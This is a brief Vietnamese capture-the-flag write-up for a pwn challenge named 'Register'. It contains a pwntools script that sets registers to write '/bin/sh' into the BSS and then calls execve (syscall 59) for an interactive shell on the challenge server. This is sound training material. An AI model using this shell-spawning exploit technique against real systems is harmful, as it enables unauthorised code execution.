# Register
### Cre: Pyo Tutor

* main func
* build func

Chương trình sử dụng signal(14, handler); kèm theo alarm(5-seconds).
Sau đó, nhận các input cho các register của chương trình.
Vậy chỉ cần truyền các tham số hợp lí, thì có thể gọi shell.

# Solution

Có 2 công việc cần làm để gọi shell
* Tạo 1 nơi chứa chuỗi `/bin/sh`
* Truyền tham số cho RDI = addr("/bin/sh"), RAX = 59,... Đợi 5s.

## Getshell



## File Exploit
```py
from pwn import * 
# s = process("./register")
s = remote('ctf.j0n9hyun.xyz', 3026)
# raw_input("debug")

binsh = "/bin/sh\x00"
#BSS_ADDR = 0x601100 = 6295808 
s.sendlineafter("RAX: ","0")
s.sendlineafter("RDI: ","0")
s.sendlineafter("RSI: ","6295808")
s.sendlineafter("RDX: ","8")
s.sendlineafter("RCX: ","0")
s.sendlineafter("R8: ","0")
s.sendlineafter("R9: ","0")

s.send(binsh)


s.sendlineafter("RAX: ","59")
s.sendlineafter("RDI: ","6295808")
s.sendlineafter("RSI: ","0")
s.sendlineafter("RDX: ","0")
s.sendlineafter("RCX: ","0")
s.sendlineafter("R8: ","0")
s.sendlineafter("R9: ","0")

sleep(4)

s.interactive()
```